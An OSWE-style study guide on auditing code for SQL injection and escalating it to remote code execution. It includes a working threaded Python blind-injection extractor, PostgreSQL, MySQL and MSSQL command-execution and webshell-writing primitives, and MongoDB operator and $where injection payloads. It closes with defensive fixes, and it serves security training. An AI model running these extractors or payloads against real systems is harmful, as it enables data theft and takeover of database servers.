# Domain 2: Advanced SQL Injection & Database-to-RCE — Study Guide

> **Exam weight:** a frequent OSWE RCE path. White-box SQLi is different from OSCP: you *read the query builder*, confirm concatenation vs parameterisation, then write a fast, reliable extractor and pivot the database into code execution.

---

## 0. White-Box SQLi Workflow

```text
   [ Read the data layer ]  find every query construction site
          │
          ▼
   [ Concatenation or parameterised? ]  tainted input in the SQL string?
          │ (yes)
          ▼
   [ Classify ]  in-band (UNION/error) vs blind (boolean/time) vs stacked
          │
          ▼
   [ Automate extraction ]  your own threaded Python extractor
          │
          ▼
   [ Pivot to RCE ]  engine-specific: PROGRAM / OUTFILE / xp_cmdshell / UDF / CLR
```

---

## 1. Auditing Query Construction

The bug is almost always **user input concatenated into a SQL string** instead of bound as a parameter. Recognise the safe vs unsafe patterns per stack:

- **PHP PDO:**
  - Unsafe: `$db->query("SELECT * FROM u WHERE id=".$_GET['id'])`.
  - Safe: `$stmt=$db->prepare("... WHERE id=?"); $stmt->execute([$id]);`
  - Watch for prepared statements that *still* concatenate (e.g. a dynamic `ORDER BY` column), which reintroduces injection.
- **Java Hibernate/HQL & JDBC:**
  - Unsafe: `session.createQuery("from User where name='"+name+"'")`; `Statement` with concatenated SQL.
  - Safe: `setParameter(...)`; `PreparedStatement` with `?`. HQL injection is real even though it is "ORM".
- **.NET Entity Framework:**
  - Unsafe: `ctx.Users.FromSqlRaw($"SELECT * FROM u WHERE n='{name}'")` with interpolation.
  - Safe: `FromSqlRaw("... WHERE n={0}", name)` (parameterised) or `FromSqlInterpolated` with real parameters.
- **Node.js `pg`/`mysql2`:**
  - Unsafe: `client.query("SELECT * FROM u WHERE id="+req.query.id)`.
  - Safe: `client.query("... WHERE id=$1",[id])` (pg) / `con.execute("... =?",[id])` (mysql2).

**Audit rule:** a parameter placeholder (`?`, `$1`, `{0}`) means the value is bound; string concatenation/interpolation of user input into SQL means injection. Grep for query builders and inspect each for concatenation.

---

## 2. Writing a Fast Blind Extractor (your own tool)

Blind SQLi returns no data — you ask boolean questions and read the answer from a page difference (boolean) or an induced delay (time). Manual extraction is infeasible; a threaded Python extractor is the OSWE-grade approach and is fully allowed.

```python
import requests, string
from concurrent.futures import ThreadPoolExecutor
BASE="http://target/item"; TRUE_MARKER="in stock"

def truth(cond):
    r=requests.get(BASE, params={"id": f"1 AND {cond}"})
    return TRUE_MARKER in r.text          # boolean; for time-based, measure r.elapsed

def char_at(query, i):
    lo,hi=32,126
    while lo<hi:                          # binary search: ~7 requests/char
        mid=(lo+hi)//2
        if truth(f"ASCII(SUBSTRING(({query}),{i},1))>{mid}"): lo=mid+1
        else: hi=mid
    return chr(lo) if lo>32 else ""

def extract(query, length):
    with ThreadPoolExecutor(max_workers=16) as ex:
        chars=list(ex.map(lambda i: char_at(query,i), range(1,length+1)))
    return "".join(chars)
```

- **Length first:** recover the value length (`LENGTH((query))`) so you can fan out one thread per character index.
- **Time-based variant:** replace `truth()` with a delay probe (`IF(cond,SLEEP(2),0)` / `pg_sleep` / `WAITFOR DELAY`) and compare `r.elapsed`; tune the threshold to your network.
- **Reliability:** add retries, a small jitter, and verify a re-read matches — graders expect deterministic output.

---

## 3. PostgreSQL SQLi-to-RCE

PostgreSQL has the richest DB-to-OS surface — know several paths because one is often disabled:

- **`COPY ... FROM/TO PROGRAM`** (superuser): `COPY t FROM PROGRAM 'id';` runs a shell command through the server process. The most direct RCE.
- **Large Objects:** `lo_import`, `lo_from_bytea`, `lo_put`, `lo_export` let you write arbitrary bytes to the filesystem — e.g. drop a malicious UDF shared object, then `CREATE FUNCTION` over it to call C code.
- **Dynamic C UDF:** compile a shared object exporting a `pg_exec`-style function, write it to disk via large objects, `CREATE FUNCTION ... LANGUAGE C`, and call it for command execution.
- **File read:** `pg_read_file('postgresql.conf')` and friends read server files (config, secrets).
- **Stacked queries** are frequently available in Postgres clients, enabling multi-statement payloads.

## 4. MySQL / MariaDB SQLi-to-RCE

- **`INTO OUTFILE` / `INTO DUMPFILE`** (requires `FILE` priv and a permissive `secure_file_priv`): write a webshell into the webroot, or write a UDF `.so` into the plugin directory and register it.
- **`general_log` poisoning:** `SET GLOBAL general_log=ON; SET GLOBAL general_log_file='/var/www/html/s.php';` then run a query containing PHP so it is logged into the webroot — RCE without `FILE` into the webroot directly.

## 5. MSSQL SQLi-to-RCE

- **`xp_cmdshell`** (re-enable via `sp_configure` if you have rights): direct OS command execution.
- **`sp_OACreate` OLE automation:** instantiate OLE objects (e.g. `WScript.Shell`) to run commands when `xp_cmdshell` is blocked but OLE automation is enabled.
- **Custom CLR assembly:** load a .NET assembly (hex-encoded) with `CREATE ASSEMBLY`, expose a stored procedure, and execute managed code — a powerful path when the above are locked down.

---

## 6. Second-Order SQL Injection

The injection is **stored** on one request and **triggered** on another. Example: a username containing SQL syntax is safely parameterised on registration (stored verbatim), but later a *different* query concatenates that stored username unsafely. White-box review is ideal for finding these because you can trace where stored data is re-used in a query.

**Audit rule:** follow stored values (profile fields, names, notes) into every *subsequent* query, not just the one that wrote them.

---

## 7. WebSocket SQL Injection

Apps that tunnel queries over WebSocket messages are injectable just like HTTP, but your tooling must speak WebSocket. Your extractor uses a WS client library (e.g. `websocket-client`) in place of `requests`; the boolean/time logic is identical. Reviewers miss these because they only test HTTP — read the WS message handlers.

---

## 8. NoSQL Injection (MongoDB / Node.js)

Document databases are injectable through *operators* and *JavaScript evaluation*:

- **Operator injection:** `{"$ne":null}`, `{"$gt":""}` alter query logic (auth bypass, Domain 1).
- **Blind extraction with `$regex`:** `{"password":{"$regex":"^a"}}` reveals, character by character, whether the field starts with a prefix — the NoSQL analogue of boolean-blind extraction, automatable with the same binary-search structure.
- **`$where` JavaScript evaluation:** if the app uses `$where` with user input, you can inject JS evaluated server-side (`this.password.length>N`), sometimes reaching code execution in the DB context.

---

## 9. Defensive & Reporting Takeaways

- **Parameterise everything.** Prepared statements/bound parameters are the fix; never concatenate user input into SQL (or HQL, or `FromSqlRaw`).
- **Least privilege DB accounts.** The web user should not be superuser (no `COPY PROGRAM`), should lack `FILE`, and `secure_file_priv` should be restrictive.
- **Disable dangerous features.** `xp_cmdshell`, OLE automation, untrusted CLR, and `COPY PROGRAM` for the app role.
- **Second-order:** parameterise the *consuming* queries too; treat stored data as untrusted.
- **NoSQL:** validate types and avoid `$where`/user-controlled operators.

---

## Key Audit & Exploit Commands

```bash
# find query construction
grep -rniE "createQuery|FromSqlRaw|\.query\(|execute\(|rawQuery|Statement" src/
# engine RCE primitives (per-engine)
# PG: COPY t FROM PROGRAM 'id';   MySQL: ... INTO OUTFILE '/var/www/s.php';
# MSSQL: EXEC xp_cmdshell 'whoami';   MSSQL OLE: sp_OACreate 'WScript.Shell'...
```

➡️ **Next:** [Exercises.md](./Exercises.md), then [Quiz_1](./Quiz_1.md) (prepared-stmt auditing), [Quiz_2](./Quiz_2.md) (blind automation), [Quiz_3](./Quiz_3.md) (SQLi-to-RCE per engine).
